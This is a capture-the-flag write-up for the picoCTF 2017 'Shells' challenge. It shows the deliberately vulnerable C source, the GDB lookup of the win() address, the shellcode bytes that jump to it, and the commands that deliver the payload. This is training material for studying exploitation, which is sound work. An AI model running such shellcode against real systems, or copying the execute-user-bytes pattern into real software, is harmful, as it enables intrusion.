## Writeup Shells
###picoCTF2017

The objective is try to get the flag of this level. The information that is given is the binary (wich is running in a certain IP:port) and the soruce code of it: 


```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>

#define AMOUNT_OF_STUFF 10

//TODO: Ask IT why this is here
void win(){
    system("/bin/cat ./flag.txt");    
}


void vuln(){
    char * stuff = (char *)mmap(NULL, AMOUNT_OF_STUFF, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
    if(stuff == MAP_FAILED){
        printf("Failed to get space. Please talk to admin\n");
        exit(0);
    }
    printf("Give me %d bytes:\n", AMOUNT_OF_STUFF);
    fflush(stdout);
    int len = read(STDIN_FILENO, stuff, AMOUNT_OF_STUFF);
    if(len == 0){
        printf("You didn't give me anything :(");
        exit(0);
    }
    void (*func)() = (void (*)())stuff;
    func();      
}

int main(int argc, char*argv[]){
    printf("My mother told me to never accept things from strangers\n");
    printf("How bad could running a couple bytes be though?\n");
    fflush(stdout);
    vuln();
    return 0;
}

```

Notice that the funcion `win()` seems to retrieve information about the flag, but there is no call to this function in the `main()` or `vuln()` function.

If you execute the program you'll realise that it asks for entering some bytes in the variable `stuff`, and it may be a good place to exploit.

So what we'll gonna try is to insert some code that makes the program "jump" to the `win()` function.

Although we have the binary, we compile it again with the following options: 

`gcc -fno-stack-protector -z execstack -m32 -o shells.out shells.c`

In this case we use `-fno-stack-protector` so there's no stack protection and `-m32` cause the original binary is 32bits.

We'll use GDB to debug the binary:

```
$ gdb -q shells.out               
Reading symbols from shells.out...(no debugging symbol
s found)...done.                                      
(gdb)                                                 
```
What we want to know is the address for the `win()` function.

```
(gdb) p win                                           
$1 = {<text variable, no debug info>} 0x804853b <win> 
(gdb)                                                 

```

For this case what we want the execution of the program to jump to this address. The solution is to write some code that can be inserted in `stuff` and the executed:

```asm
mov eax, 0x804853b
call eax
````
*If you are using a 64bit binary you can use `rax` register.*

If you Assemble de code you'll get the following string:

```

"\xB8\x3B\x85\x04\x08\xFF\xD0"

```

That's the string we should use to jump to the `win()` function.

Finally we save this string to a file:

```
python -c "print('\xB8\x3B\x85\x04\x08\xFF\xD0')" >payload

```

And the we use it to run the binary:
```
cat payload - | shell.out

```



















